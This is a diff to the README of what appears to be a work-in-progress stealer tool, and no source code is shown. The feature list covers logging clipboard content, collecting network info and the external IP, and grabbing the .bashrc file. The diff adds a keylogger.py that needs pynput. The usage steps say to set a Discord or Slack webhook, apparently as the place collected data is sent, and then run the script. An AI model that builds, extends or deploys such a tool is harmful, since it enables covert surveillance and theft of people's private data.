@@ -17,13 +17,14 @@ wip so no proper readme for now lol
 - logs clipboard content
 - grabs network info & external ip
 - grabs .bashrc file
+- i also made keylogger.py which im gonna use later
 
 ### how to use
-1. open the script
-2. replace `WEBHOOK = "webhook"` with your actual Discord/Slack/whatever webhook URL
-3. install dependencies: `pip install requests pyperclip`
-4. run it: `python main.py` (or whatever you named it)
-5. select options from the menu
+1.  open the script
+2.  replace `WEBHOOK = "webhook"` with your actual Discord/Slack/whatever webhook URL
+3.  install dependencies: `pip install requests pyperclip` <br> </br>3.5 if u wanna use keylogger.py also `pip install pynput`
+4.  run it: `python main.py` (or whatever you named it)
+5.  select options from the menu
 
 ### todo / bugs
 - `cd` is buggy sometimes
